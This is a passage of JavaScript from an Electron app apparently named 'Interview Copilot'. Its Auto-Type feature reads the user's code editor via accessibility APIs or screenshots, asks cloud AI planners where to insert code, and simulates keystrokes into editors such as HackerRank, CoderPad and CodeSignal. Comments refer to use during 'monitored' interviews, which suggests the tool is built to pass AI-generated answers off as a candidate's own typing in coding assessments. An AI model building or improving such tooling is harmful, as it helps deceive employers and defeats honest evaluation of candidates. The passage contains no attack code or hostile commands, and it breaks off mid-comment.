    // we need to absorb the PowerShell cold start. The plan is load-bearing
    // — getting skipLines wrong means typing into the wrong spot — so we'd
    // rather wait 3s than fall through to skipLines=0 and overwrite.
    const uia = await readFocusedViaUIA(3500);

    // ── Preflight: is the user actually focused on a foreign editor? ──
    // The most common Auto-Type failure mode is the user clicking the button
    // and forgetting to alt-tab — so we type into our own popout, our chat
    // input, or nothing at all. Check the focused element's process id (we
    // taught the UIA bridge to report it). If it matches our own pid OR a
    // child of ours, abort with a user-actionable message instead of silently
    // typing into the void.
    const ownPid = process.pid;
    const focusedPid = uia && typeof uia.processId === 'number' ? uia.processId : 0;
    const focusedProcName = uia && typeof uia.processName === 'string' ? uia.processName : '';
    // Electron spawns helper processes (renderer, gpu, utility) — they share
    // a process name but not pid. Match on either: (a) exact pid, or (b)
    // process name starts with our productName. We deliberately do NOT match
    // a bare 'electron' substring — that would false-positive on every
    // Electron-based editor (VS Code, Cursor, Atom, even some browsers'
    // helper processes), aborting Auto-Type when the user IS in the right
    // place. Only our own packaged binary's name should match.
    const procNameLower = (focusedProcName || '').toLowerCase();
    const looksLikeOurProcess = (
      focusedPid === ownPid ||
      procNameLower.startsWith('interview copilot') ||
      procNameLower.startsWith('interviewcopilot')
    );
    if (looksLikeOurProcess) {
      console.warn(`[auto-type] Preflight failed: focus is on our own process (pid=${focusedPid}, name=${focusedProcName}). Aborting before keystrokes.`);
      // Restore main window visibility before bailing — otherwise the user
      // is left with nothing on screen.
      restore.forEach(fn => { try { fn(); } catch (_) {} });
      autoTypeAbort = true;
      autoTypeAbortReason = 'no_target_editor';
      autoTypeAbortDiagnostic = {
        hint: `Auto-Type aborted: your focus is still on the ${focusedProcName || 'AI app'} window. Click into your code editor (HackerRank, VS Code, IDE) before pressing Auto-Type again.`,
      };
      autoTypeInFlight = false;
      autoTypeBroadcast({
        phase: 'done',
        aborted: true,
        reason: 'no_target_editor',
        hint: autoTypeAbortDiagnostic.hint,
      });
      // L21: this return leaked its _pending log entry as well.
      autoTypePlanLog.record(_atRunId, { earlyBail: 'no_target_editor', aborted: true, focusedProcName });
      try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
      autoTypeCurrentRunId = null;
      return { aborted: true, reason: 'no_target_editor' };
    }

    // ── Guard A: accessibility-placeholder = UIA-blind ──
    // If UIA returned the "editor is not accessible" stub (VS Code etc.)
    // instead of real content, blank it so every downstream consumer
    // (planAutoTypeFromUIA, the vision planner's editorText, the multi-op
    // structural filter, the flat-UIA Ctrl+A path) treats this as
    // blindness and the screenshot vision planner runs as primary —
    // rather than trusting a 99-char stub as the editor's code.
    if (uia && uia.ok && isUiaPlaceholderText(uia.text)) {
      console.warn(`[auto-type] UIA returned an accessibility placeholder ("${(uia.text || '').trim().slice(0, 56)}…") — treating editor as UIA-blind; vision will read the screenshot instead.`);
      autoTypePlanLog.record(_atRunId, { uiaPlaceholderDetected: true, uiaPlaceholderText: (uia.text || '').trim().slice(0, 120) });
      uia.text = '';
      uia.uiaPlaceholder = true;
    }

    if (uia && uia.ok) {
      uiaSnapshotBefore = uia;
      if (typeof uia.text === 'string') {
        autoTypePlanLog.record(_atRunId, { beforeText: uia.text, beforeCursorOffset: uia.cursorOffset });
      }
      const plan = planAutoTypeFromUIA({
        code,
        editorText: uia.text || '',
        cursorOffset: uia.cursorOffset || 0,
        processName: uia.processName || '',
      });

      // Verbose diagnostic dump so we can see — after the fact — what UIA
      // read and why the planner decided what it did. Shows up in the task
      // output log for post-mortem. Trimmed to avoid flooding on huge files.
      const txt = uia.text || '';
      const preview = (s, n) => {
        const t = (s || '').replace(/\r/g, '').split('\n').slice(0, n).map((l, i) => `    [${i}] ${JSON.stringify(l.length > 120 ? l.slice(0, 120) + '…' : l)}`).join('\n');
        return t || '    (empty)';
      };
      console.log(`[auto-type] UIA read: source=${uia.source || '?'} textLen=${txt.length} cursorOffset=${uia.cursorOffset || 0}`);
      console.log(`[auto-type] UIA editor head:\n${preview(txt, 6)}`);
      console.log(`[auto-type] Code head:\n${preview(code, 6)}`);
      console.log(`[auto-type] UIA plan: skip=${plan.skipLines} trail=${plan.skipTrailingLines || 0} wipe=${!!plan.wipeFirstLine} conf=${plan.confidence.toFixed(2)} reason=${plan.reason}`);

      // Only override when the UIA plan is confident. Low-confidence UIA
      // results fall back to whatever the renderer computed (could be 0,
      // could be an OCR guess).
      if (plan.confidence >= 0.85) {
        // Store the deterministic plan's values REGARDLESS — they are the
        // fallback floor. If vision / agent / haiku all fail to produce a
        // plan, the single-region typing path below uses these.
        effectiveSkipLines = plan.skipLines;
        effectiveSkipTrailing = plan.skipTrailingLines || 0;
        wipeFirstLine = !!plan.wipeFirstLine;
        // ── PRIORITY: vision is PRIMARY, the deterministic planner is the
        // fallback — NOT the other way around. ──
        // The deterministic planner is SINGLE-REGION: one skip + one
        // cursor position. It physically cannot express the multi-chunk /
        // broken-code / junk-line / missing-import reality the vision
        // planner exists to handle. So it may only SHORT-CIRCUIT vision
        // (set usedUIA=true → skip the whole vision block) for ONE reason:
        //   `fully_present` — the code is already entirely in the editor,
        //   there is genuinely nothing for vision to do.
        // Every other "confident" verdict — `cursor_mid_line`,
        // `prefix_match`, `snippet_insert_at_cursor` — is a single-region
        // GUESS. `cursor_mid_line` in particular is the exact scenario the
        // user keeps hitting: drop the caret mid-line and the old code
        // said "I'm 90% sure — type the whole file from here", which is
        // the "it writes the code from the beginning" bug. For those, we
        // keep the deterministic values as the fallback floor but let the
        // vision planner run as PRIMARY. usedUIA stays false → the vision
        // block runs → if vision produces a usable plan it wins; if every
        // cloud planner fails, we still fall through to the single-region
        // path with these deterministic values intact (no regression).
        if (plan.reason === 'fully_present') {
          usedUIA = true;
        } else {
          console.log(`[auto-type] UIA plan '${plan.reason}' (conf ${plan.confidence.toFixed(2)}) kept as FALLBACK floor only — vision planner runs as primary (skip=${plan.skipLines} held in reserve)`);
        }
      } else {
        console.log(`[auto-type] UIA plan rejected (conf < 0.85) — using skipLines=${skipLines} from caller`);
      }
    } else if (uia) {
      console.log(`[auto-type] UIA unavailable: ${uia.error || 'unknown'}`);
    }
  } catch (uiaErr) {
    console.warn('[auto-type] UIA read threw:', uiaErr && uiaErr.message);
  }

  // ── Haiku AI plan fallback ──
  // Only fires when (a) we got a UIA snapshot and (b) the deterministic
  // planner DIDN'T earn the high-confidence override. Haiku returns a
  // richer plan than the deterministic one — cursor_action, wipe_chars,
  // prefix, suffix in addition to skip/wipe_first_line. Falls through
  // silently to whatever skipLines the caller passed on any failure.
  let cursorAction = 'use_current';
  let cursorTargetLine = 0;
  let cursorTargetColumn = 0;
  // Signed line count for cursor_action='move_relative' (vision planner):
  // how many lines to move the caret FROM ITS CURRENT POSITION before
  // typing. Negative = up, positive = down. Applied via counted arrow
  // keys — invisible, no go-to-line widget, no scroll-to-top flash.
  let cursorLinesDelta = 0;
  // Vision planner v2 produces an ordered list of edit operations
  // (replace/insert/delete anchored to document line numbers) instead of
  // the single-region skip/cursor plan. When set, the multi-op executor
  // runs and the single-region slice-and-type path is skipped entirely.
  let multiOpPlan = null;
  let wipeChars = 0;
  let typePrefix = '';
  let typeSuffix = '';
  // True once any cloud planner (vision / text-agent / haiku) returned a
  // plan we accepted (confidence >= 0.7). Drives the post-type verify
  // gate so we only re-read UIA when there's a real plan to verify
  // against. (Was named `usedHaiku` historically — kept being reused as
  // new planners landed; renamed for clarity.)
  let aiPlanAccepted = false;
  // ── Observability ──
  // These two are hoisted to the handler scope (not block-scoped) so the
  // 'planner-decision' broadcast below — which the renderer surfaces to
  // the USER — can report which planner actually drove the run and, on a
  // miss, exactly WHY (route 404, local-only mode, no token, capture
  // failed, low confidence). This is what ends the "diagnose → still
  // broken → diagnose" loop: the app self-reports instead of us guessing.
  let plannerLabel = 'deterministic-uia';     // overwritten as we go
  let plannerDetail = '';                     // human-readable "why"
  // ── Mid-run entitlement revocation ──
  // All three planner routes (/autotype-vision, /autotype-agent,
  // /autotype-plan) sit behind the SAME requireTier('ultra') middleware, so a
  // 401/402/403 from any of them is the server saying "not entitled" —
  // exactly the answer Gate 2 asked for at the top, arriving late (token
  // expired mid-run, subscription cancelled between the two calls, or a
  // local-only run that never got to ask). It used to be swallowed as "the
  // cloud planner is unavailable, use the deterministic fallback" and the
  // keystrokes went out anyway. Now it stops the run — and it still lands
  // BEFORE the typing loop, which starts well below this block.
  let entitlementDeniedStatus = 0;
  if (usedUIA) {
    plannerLabel = 'deterministic-uia';
    plannerDetail = `UIA read the editor directly (skip ${effectiveSkipLines}/${effectiveSkipTrailing})`;
  }
  // ── Diagnostic: make the fallback-planner decision EXPLICIT in the
  // log. "Why didn't vision run?" must be answerable from the
  // main-process output alone. This prints on every low-confidence run.
  if (!usedUIA) {
    plannerLabel = 'deterministic-fallback';  // until a cloud planner wins
    if (!authToken) plannerDetail = 'not signed in — cloud planners need an auth token';
    else if (localOnly) plannerDetail = 'Local-Only Auto-Type is ON — cloud planners (incl. vision) are disabled in settings';
    const willEnter = !!authToken && !localOnly;
    console.log(`[auto-type] fallback-planner gate: usedUIA=false hasSnapshot=${!!uiaSnapshotBefore} hasAuthToken=${!!authToken} localOnly=${localOnly} → ${willEnter ? 'ENTERING vision→agent→haiku fallback' : 'SKIPPED (' + (!authToken ? 'no auth token' : 'local-only mode') + ')'}`);
  }
  if (!usedUIA && authToken && localOnly) {
    // User is in local-only mode (corporate network / monitored interview).
    // Surface the skip in the log so the diagnostic trail explains why the
    // deterministic-low-confidence path didn't get the cloud fallback —
    // otherwise it looks like a silent capability regression.
    console.log('[auto-type] cloud planners skipped: localOnlyAutoType=true (vision + agent fallback disabled by user)');
  }
  // CRITICAL: this gate does NOT require uiaSnapshotBefore. UIA returns
  // ok:false (no TextPattern) for contentEditable-based editors —
  // CodeMirror on CoderPad is the canonical case — which leaves
  // uiaSnapshotBefore null. That is EXACTLY when the vision planner is
  // most needed (UIA is blind), so gating on the snapshot here was the
  // bug that made vision never fire on CoderPad. We only need authToken
  // (to call the server) and !localOnly (cloud allowed).
  if (!usedUIA && authToken && !localOnly) {
    try {
      // uiaSnapshotBefore may be null (UIA ok:false). The vision planner
      // doesn't need it — it reads a screenshot. The text-agent fallback
      // below DOES use snapText; it degrades to '' which makes the text
      // agent blind, but that's fine — vision is tried first and is the
      // real path for these editors.
      const snapText = uiaSnapshotBefore ? (uiaSnapshotBefore.text || '') : '';
      const cursorOff = uiaSnapshotBefore ? (uiaSnapshotBefore.cursorOffset || 0) : 0;
      // Broadcast 'thinking' phase so the renderer can show a "Reading
      // editor — Sonnet is reasoning..." pill instead of a silent gap.
      // Sonnet calls take 3-8s vs Haiku's 0.5-1s, so the user feedback
      // matters more here.
      autoTypeBroadcast({ phase: 'thinking', source: 'agent' });
      // GOD-LEVEL PATH: try the AI agent first. The /autotype-agent
      // endpoint is now two-tier internally — Sonnet 5 (Anthropic)
      // primary with Groq Llama-3.3-70B fail-over on Anthropic outage.
      // Both planners use chain-of-thought + forced tool_choice. The
      // response includes a `planner_used` field ('sonnet' or 'groq')
      // so we can surface which vendor served this run in logs/UI.
      // Falls through to Haiku on any failure (503, parse error, low
      // confidence) so we get graceful degradation.
      let aiPlan = null;
      let plannerSource = 'sonnet-agent';  // Default; updated from response below

      // ── TIER 1: Vision planner ──
      // UIA came back blind (low confidence) — almost always a browser-
      // hosted editor (Monaco on HackerRank/CodeSignal, CodeMirror on
      // CoderPad). A passive screenshot is the ONLY thing that can
      // actually see the editor's content + caret from outside the
      // browser. Capture a frame in-process (no flash, no scroll, no
      // clipboard) and let Sonnet vision read it. Any failure falls
      // straight through to the text agent below.
      try {
        console.log('[auto-type] TIER 1: vision planner — capturing screen…');
        const shot = await captureScreenForVision();
        if (shot && shot.base64) {
          console.log(`[auto-type] vision: screenshot captured (${shot.base64.length} b64 chars, ${shot.mediaType}) — calling /autotype-vision`);
          // Persist screenshot to disk so the JSONL entry has a sibling
          // PNG showing exactly what the planner saw. Best-effort — if
          // it fails the run still proceeds and commits.
          try {
            const shotPath = autoTypePlanLog.saveScreenshot(_atRunId, shot.base64, shot.mediaType, app);
            if (shotPath) {
              autoTypePlanLog.record(_atRunId, { screenshotPath: shotPath, screenshotMediaType: shot.mediaType });
              console.log(`[auto-type] vision: screenshot saved → ${shotPath}`);
            }
          } catch (_) { /* non-fatal */ }
          autoTypeBroadcast({ phase: 'thinking', source: 'vision' });
          const visRes = await fetch(`${API_BASE}/api/v1/ai/autotype-vision`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${authToken}`,
            },
            body: JSON.stringify({
              screenshotBase64: shot.base64,
              screenshotMediaType: shot.mediaType,
              code,
              language,
              // ── Ground-truth editor text for line-number reconciliation ──
              // Without this, vision counts lines from the screenshot's gutter
              // and occasionally miscounts blank lines (off-by-one bug that
              // made it target the main() signature instead of a stub two
              // lines below). Passing UIA's accessibility-read text gives
              // vision a SECOND source of truth — when the screenshot gutter
              // disagrees with this text, vision should trust THIS for line
              // numbering. Empty when UIA was blind on this editor.
              editorText: snapText,
            }),
          });
          if (visRes.ok) {
            const visPlan = await visRes.json().catch(() => null);
            if (visPlan && visPlan.ok === true) {
              aiPlan = visPlan;
              plannerSource = 'vision-agent';
              console.log(`[auto-type] vision planner served the plan (conf=${visPlan.confidence})`);
            } else {
              console.log('[auto-type] vision returned non-ok plan — falling through to text agent');
              plannerDetail = 'vision planner returned an unusable plan — fell back';
            }
          } else {
            console.log(`[auto-type] vision endpoint HTTP ${visRes.status} — falling through to text agent`);
            if (visRes.status === 401 || visRes.status === 402 || visRes.status === 403) entitlementDeniedStatus = visRes.status;
            // The single most common real failure: the app is calling a
            // server that doesn't have /autotype-vision (production not
            // deployed, or API_BASE wrong). Make it unmissable.
            plannerDetail = `vision route returned HTTP ${visRes.status} from ${API_BASE} — server missing the /autotype-vision route (deploy it, or run a local server)`;
          }
        } else {
          console.log('[auto-type] vision capture unavailable — falling through to text agent');
          plannerDetail = 'screen capture for vision returned nothing (desktopCapturer gave no frame)';
        }
      } catch (visErr) {
        console.warn('[auto-type] vision planner threw, falling through to text agent:', visErr && visErr.message);
        plannerDetail = `vision call threw: ${visErr && visErr.message} (is ${API_BASE} reachable?)`;
      }

      // ── TIER 2: text agent ──
      // Was the original first attempt; now only runs if the vision
      // planner didn't produce a plan. On a browser editor it is itself
      // blind (snapText is empty), but it's kept as graceful degradation
      // for native editors that reached this fallback for other reasons.
      if (!aiPlan) try {
        const agentRes = await fetch(`${API_BASE}/api/v1/ai/autotype-agent`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${authToken}`,
          },
          body: JSON.stringify({
            editorText: snapText,
            cursorOffset: cursorOff,
            code,
            language,
          }),
        });
        if (agentRes.ok) {
          const agentPlan = await agentRes.json().catch(() => null);
          if (agentPlan && agentPlan.ok === true) {
            aiPlan = agentPlan;
            // Identify which planner served this. The server's
            // /autotype-agent route returns planner_used to disambiguate
            // Sonnet (primary) from Groq (fallback) when Anthropic is
            // degraded. Older server builds may omit the field — default
            // to 'sonnet-agent' so logs stay coherent.
            if (agentPlan.planner_used === 'groq') {
              plannerSource = 'groq-fallback';
              console.log(`[auto-type] agent served by Groq fallback (sonnet error: ${agentPlan.sonnet_error || 'unknown'})`);
            } else if (agentPlan.planner_used === 'sonnet') {
              plannerSource = 'sonnet-agent';
            }
          } else {
            console.log('[auto-type] agent returned non-ok plan, falling through to Haiku');
          }
        } else {
          console.log(`[auto-type] agent endpoint HTTP ${agentRes.status} — trying Haiku fallback`);
          if (agentRes.status === 401 || agentRes.status === 402 || agentRes.status === 403) entitlementDeniedStatus = agentRes.status;
        }
      } catch (agentErr) {
        console.warn('[auto-type] agent call threw, trying Haiku fallback:', agentErr && agentErr.message);
      }

      // Fallback: original Haiku one-shot. Kept as a cheaper / faster
      // backup for when the Sonnet agent is unavailable (Anthropic
      // outage, server cold start, network blip).
      if (!aiPlan) {
        plannerSource = 'haiku-fallback';
        const planRes = await fetch(`${API_BASE}/api/v1/ai/autotype-plan`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${authToken}`,
          },
          body: JSON.stringify({
            editorText: snapText,
            cursorOffset: cursorOff,
            code,
            language,
          }),
        });
        if (planRes.ok) {
          aiPlan = await planRes.json().catch(() => null);
          // A 200 here is the tier gate confirming Ultra for this token just
          // as surely as the preflight probe did — refresh the grace window
          // so a user who runs Auto-Type daily never falls out of it.
          autoTypeRememberEntitlement(autoTypeIdentityKey(authToken));
        } else if (planRes.status === 401 || planRes.status === 402 || planRes.status === 403) {
          // THE line. This used to fall through to "deterministic fallback"
          // and type anyway, which made the only real server-side gate on
          // the $159/mo feature a no-op.
          console.error(`[auto-type] Haiku planner HTTP ${planRes.status} — ENTITLEMENT DENIED by the server; aborting the run.`);
          entitlementDeniedStatus = planRes.status;
        } else if (planRes.status === 404 || planRes.status === 503) {
          console.warn(`[auto-type] Haiku planner HTTP ${planRes.status} — using deterministic fallback only (server may need redeploy)`);
          autoTypeBroadcast({
            phase: 'planner-unavailable',
            status: planRes.status,
          });
        }
      }

      // Plan acceptance — confidence threshold 0.7 holds for all planner
      // shapes. The VISION planner (v2) returns `operations` (an ordered
      // edit list); the text/Haiku planners return the single-region
      // skip/cursor shape. Both are accepted here; the multi-op branch
      // later in the handler routes on `multiOpPlan`.
      if (aiPlan && aiPlan.ok === true
          && Number.isFinite(aiPlan.confidence) && aiPlan.confidence >= 0.7) {
        // ── Vision v2: multi-operation plan ──
        if (Array.isArray(aiPlan.operations) && aiPlan.operations.length > 0) {
          multiOpPlan = aiPlan.operations;
          aiPlanAccepted = true;
          plannerLabel = 'vision';
          const opSummary = aiPlan.operations
            .map(o => `${o.op} L${o.start_line}${o.op === 'insert' ? '' : '-' + o.end_line}`)
            .join(', ');
          plannerDetail = `${aiPlan.operations.length} edit op(s): ${opSummary}`;
          const visReasoning = (aiPlan.reasoning || '').replace(/\s+/g, ' ').slice(0, 200);
          console.log(`[auto-type] vision multi-op plan ACCEPTED (conf=${aiPlan.confidence.toFixed(2)}): ${opSummary} — ${visReasoning}`);
          autoTypePlanLog.record(_atRunId, {
            plannerSource: 'vision-multi-op',
            confidence: aiPlan.confidence,
            reasoning: aiPlan.reasoning,  // full text, not the 200-char truncated visReasoning
            operations: aiPlan.operations,
          });
          if (visReasoning) {
            autoTypeBroadcast({ phase: 'plan-ready', source: 'vision', reasoning: visReasoning, confidence: aiPlan.confidence });
          }
          // Skip the single-region field parsing below — none of it
          // applies to a multi-op plan. Fall through past the acceptance
          // block; the multi-op branch downstream does the work.
        } else if (aiPlan.planner_used === 'vision' && Array.isArray(aiPlan.operations)) {
          // Vision returned an EMPTY operations list with high confidence.
          // The agent's prompt explicitly says "empty array = nothing to
          // do" (e.g. the editor already contains the correct solution).
          // Without this branch, execution would fall through to the
          // single-region parser below — which finds undefined skip/cursor
          // fields, defaults effectiveSkipLines=0, and types the WHOLE
          // file from the cursor: the exact "writes the code from the
          // beginning" symptom, just from a different trigger. Instead
          // skip every line so the single-region path's lines.length===0
          // early-exit fires and we cleanly broadcast 'done'.
          const allLineCount = code.split('\n').length;
          effectiveSkipLines = allLineCount;
          effectiveSkipTrailing = 0;
          wipeFirstLine = false;
          cursorAction = 'use_current';
          aiPlanAccepted = true;
          plannerLabel = 'vision';
          plannerDetail = 'vision: editor already correct, nothing to type';
          console.log(`[auto-type] vision returned empty operations (conf=${aiPlan.confidence.toFixed(2)}) — explicit no-op`);
        } else {
        effectiveSkipLines = Number.isInteger(aiPlan.skip_leading) ? Math.max(0, aiPlan.skip_leading) : 0;
        effectiveSkipTrailing = Number.isInteger(aiPlan.skip_trailing) ? Math.max(0, aiPlan.skip_trailing) : 0;
        wipeFirstLine = !!aiPlan.wipe_first_line;
        // 'move_relative' is the vision planner's invisible cursor-reposition
        // (counted arrow keys from the current caret). The text/Haiku
        // planners never emit it — they use use_current/move_to_end/
        // go_to_line — so the union of valid actions covers all three
        // planner sources.
        let proposedCursor = ['use_current', 'move_to_end', 'go_to_line', 'move_relative'].includes(aiPlan.cursor_action)
          ? aiPlan.cursor_action : 'use_current';
        cursorTargetLine = Number.isInteger(aiPlan.target_line) ? aiPlan.target_line : 0;
        cursorTargetColumn = Number.isInteger(aiPlan.target_column) ? aiPlan.target_column : 0;
        cursorLinesDelta = Number.isInteger(aiPlan.lines_delta)
          ? Math.max(-400, Math.min(400, aiPlan.lines_delta)) : 0;
        // ── Cursor-respect override ──
        // The user just dropped their cursor where they want code typed. If
        // the planner says "move to end of file" but the editor has a
        // template with driver code BELOW the cursor (effectiveSkipTrailing
        // > 0 means the planner itself detected post-cursor content), then
        // moving to end would land the code BELOW the driver code — wrong
        // place, looks like "started from beginning of new section" to the
        // user. Same for go_to_line(0|1) — that's "jump to top," which
        // overrides the cursor placement the user just made.
        //
        // 'move_relative' is NOT overridden here — it's a deliberate,
        // bounded reposition the VISION planner computed by actually
        // seeing the caret and the insertion point in the screenshot. If
        // delta is 0 it's equivalent to use_current anyway.
        const editorHasContentBelowCursor = effectiveSkipTrailing > 0;
        if (proposedCursor === 'move_to_end' && editorHasContentBelowCursor) {
          console.log('[auto-type] cursor: planner asked move_to_end but editor has content below cursor — honoring user cursor instead');
          proposedCursor = 'use_current';
        } else if (proposedCursor === 'go_to_line' && cursorTargetLine <= 1) {
          console.log(`[auto-type] cursor: planner asked go_to_line(${cursorTargetLine}) — too close to top, honoring user cursor instead`);
          proposedCursor = 'use_current';
        } else if (proposedCursor === 'move_relative' && cursorLinesDelta === 0) {
          // Vision planner said "stay on this line" — same as use_current.
          proposedCursor = 'use_current';
        }
        cursorAction = proposedCursor;
        wipeChars = Number.isInteger(aiPlan.wipe_chars) ? Math.max(0, Math.min(200, aiPlan.wipe_chars)) : 0;
        typePrefix = typeof aiPlan.prefix === 'string' ? aiPlan.prefix.slice(0, 200) : '';
        typeSuffix = typeof aiPlan.suffix === 'string' ? aiPlan.suffix.slice(0, 200) : '';
        aiPlanAccepted = true;
        const reasoning = (aiPlan.reasoning || '').replace(/\s+/g, ' ').slice(0, 200);
        const cursorDetail =
          cursorAction === 'go_to_line' ? `(L${cursorTargetLine}:C${cursorTargetColumn})`
          : cursorAction === 'move_relative' ? `(${cursorLinesDelta >= 0 ? '+' : ''}${cursorLinesDelta}L:C${cursorTargetColumn})`
          : '';
        // Record which cloud planner won, for the user-facing self-report.
        plannerLabel = plannerSource === 'vision-agent' ? 'vision'
          : plannerSource === 'haiku-fallback' ? 'haiku'
          : plannerSource === 'groq-fallback' ? 'text-agent (groq)'
          : 'text-agent (sonnet)';
        const cursorHuman = cursorAction === 'move_relative'
          ? `moved cursor ${cursorLinesDelta >= 0 ? 'down' : 'up'} ${Math.abs(cursorLinesDelta)} line(s) → col ${cursorTargetColumn}`
          : cursorAction === 'move_to_end' ? 'moved cursor to end of file'
          : cursorAction === 'go_to_line' ? `jumped to line ${cursorTargetLine}`
          : 'typed at your cursor';
        plannerDetail = `skipped ${effectiveSkipLines} line(s) above + ${effectiveSkipTrailing} below; ${cursorHuman}`;
        console.log(`[auto-type] ${plannerSource} plan ACCEPTED: cursor=${cursorAction}${cursorDetail} wipeChars=${wipeChars} skip=${effectiveSkipLines} trail=${effectiveSkipTrailing} wipeLine=${wipeFirstLine} prefix=${JSON.stringify(typePrefix.slice(0, 30))} suffix=${JSON.stringify(typeSuffix.slice(0, 30))} conf=${aiPlan.confidence.toFixed(2)} reason=${reasoning}`);
        autoTypePlanLog.record(_atRunId, {
          plannerSource,
          confidence: aiPlan.confidence,
          reasoning: aiPlan.reasoning,
          singleRegionPlan: {
            cursorAction,
            cursorTargetLine,
            cursorTargetColumn,
            cursorLinesDelta,
            wipeChars,
            skipLines: effectiveSkipLines,
            skipTrailingLines: effectiveSkipTrailing,
            wipeFirstLine,
            prefix: typePrefix,
            suffix: typeSuffix,
          },
        });
        // Surface the planner's reasoning to the renderer so the user (and
        // future debugging) can see WHY it chose this plan — the model's
        // thinking is auditable, not hidden in a JSON blob. Tag the source
        // so the renderer can show "served by Groq" / "read your screen"
        // hints. Vision is tagged 'vision' so the UI can say so explicitly.
        if (reasoning && (plannerSource === 'vision-agent' || plannerSource === 'sonnet-agent' || plannerSource === 'groq-fallback')) {
          autoTypeBroadcast({
            phase: 'plan-ready',
            source: plannerSource === 'vision-agent' ? 'vision'
                  : plannerSource === 'groq-fallback' ? 'groq'
                  : 'agent',
            reasoning,
            confidence: aiPlan.confidence,
          });
        }
        }  // end single-region branch (else of the multi-op check)
      } else if (aiPlan) {
        console.log(`[auto-type] ${plannerSource} plan rejected (conf=${aiPlan.confidence ?? '?'}, threshold=0.7)`);
        if (!plannerDetail) {
          plannerDetail = `${plannerSource} plan rejected — confidence ${aiPlan.confidence ?? '?'} below 0.7 threshold; fell back to basic typing`;
        }
      }
    } catch (planErr) {
      console.warn('[auto-type] AI plan call failed:', planErr && planErr.message);
      if (!plannerDetail) plannerDetail = `cloud planner call failed: ${planErr && planErr.message}`;
    }
  }

  // A planner route told us this account is not entitled. Stop here — this
  // is still upstream of every keystroke — and put the window back, because
  // by now we have hidden it. The message mirrors Gate 2's so the user sees
  // one story regardless of which check caught it.
  if (entitlementDeniedStatus) {
    const denialHint = entitlementDeniedStatus === 401
      ? 'Auto-Type could not verify your plan — your session expired. Sign in again, then retry.'
      : 'Auto-Type is an Ultra feature, and the server says this account is not on the Ultra plan. Upgrade from Settings → Subscription to use it.';
    if (entitlementDeniedStatus !== 401) {
      const deniedKey = autoTypeIdentityKey(authToken);
      autoTypeForgetEntitlement(deniedKey);
      // Drop the SIGNED grant too. This is the one path where a live tier
      // denial can arrive while a perfectly valid claim is still in the file
      // — the claim was minted hours ago and the subscription ended since —
      // and leaving it there would let Gate 2 wave the next run straight
      // through on stale evidence. A 401 is not a tier verdict, so it does
      // not touch either store.
      autoTypeForgetSignedClaim(deniedKey);
    }
    console.error(`[auto-type] REFUSED mid-run: planner route returned HTTP ${entitlementDeniedStatus} — nothing typed.`);
    restore.forEach(fn => { try { fn(); } catch (_) {} });
    autoTypeAbort = true;
    autoTypeAbortReason = entitlementDeniedStatus === 401 ? 'entitlement_signed_out' : 'entitlement_denied';
    autoTypeAbortDiagnostic = { hint: denialHint };
    autoTypePlanLog.record(_atRunId, {
      earlyBail: autoTypeAbortReason,
      entitlement: { reason: autoTypeAbortReason, status: entitlementDeniedStatus, localOnly, midRun: true },
    });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    autoTypeInFlight = false;
    autoTypeBroadcast({
      phase: 'done',
      aborted: true,
      reason: autoTypeAbortReason,
      hint: denialHint,
    });
    return { aborted: true, reason: autoTypeAbortReason };
  }

  // UIA read can block up to 3.5s. If the user clicked cancel during that
  // wait, honor it now — don't broadcast 'typing' and don't start keystrokes.
  if (autoTypeAbort) {
    restore.forEach(fn => { try { fn(); } catch (_) {} });
    autoTypeBroadcast({ phase: 'done', aborted: true });
    autoTypeInFlight = false;
    // L21: fourth of the four early returns that leaked a _pending entry.
    autoTypePlanLog.record(_atRunId, { earlyBail: 'user_abort_before_typing', aborted: true });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    return { aborted: true };
  }

  // ── Self-report: tell the renderer (and thus the USER) exactly which
  // planner drove this run and why. This is the line that ends the
  // "diagnose → still broken → diagnose" loop — instead of guessing at
  // runtime state, the app shows it. plannerLabel is one of:
  //   vision | text-agent (sonnet|groq) | haiku | deterministic-uia |
  //   deterministic-fallback
  // plannerDetail is a human-readable "why" (skip counts + cursor move on
  // success; 404 / local-only / no-token / capture-failed / low-conf on a
  // miss). apiBase confirms which server was actually called.
  autoTypeBroadcast({
    phase: 'planner-decision',
    planner: plannerLabel,
    detail: plannerDetail,
    apiBase: API_BASE,
    skipLeading: effectiveSkipLines,
    skipTrailing: effectiveSkipTrailing,
    cursorAction,
  });

  // ── MULTI-OP BRANCH (vision planner v2) ──
  // When the vision planner returned an ordered operation list, execute
  // that instead of the single-region slice-and-type path below. This is
  // the structural-edit engine: navigate to each region, make a targeted
  // replace/insert/delete, bottom-to-top so line numbers stay valid. The
  // single-region path (everything below) is untouched and still serves
  // the UIA / text-agent / Haiku plans.
  if (multiOpPlan) {
    autoTypeBroadcast({ phase: 'typing' });
    try {
      // Pass UIA editor text so the executor can refuse ops that target
      // structural lines (class/method/import) when vision miscounted
      // blank lines. `uiaSnapshotBefore.text` is the editor's content at
      // the start of the run.
      const uiaText = (uiaSnapshotBefore && typeof uiaSnapshotBefore.text === 'string')
        ? uiaSnapshotBefore.text
        : '';
      const uiaProcName = (uiaSnapshotBefore && typeof uiaSnapshotBefore.processName === 'string')
        ? uiaSnapshotBefore.processName
        : '';
      const result = await executeMultiOpPlan(multiOpPlan, { keyboard, Key, mouse, uiaText, processName: uiaProcName });
      console.log(`[auto-type] multi-op plan complete: ${result.opCount}/${multiOpPlan.length} operation(s) executed${autoTypeAbort ? ' (aborted mid-run)' : ''}`);
      autoTypePlanLog.record(_atRunId, {
        executionTrace: result.executionTrace || [],
        opsExecuted: result.opCount,
        opsPlanned: multiOpPlan.length,
        refused: result.refused || null,
      });

      // ── Guard D: post-execution catastrophic-collapse detection ──
      // The plan-level guards can't catch an EXECUTION failure — e.g. Monaco
      // swallowed the content keystrokes and only the indentation landed
      // (run 82aa473a3f88: a 305-char Java template became 122 chars of pure
      // whitespace). The per-op verify below MISSES this when UIA is
      // post-type unreadable, because it treats "can't read" as success
      // (autoTypeVerifyMultiOp early-returns ok:true on uia_unavailable). So
      // check the readable-collapse signature explicitly: had real code
      // before, now essentially whitespace ⇒ don't report success. We do NOT
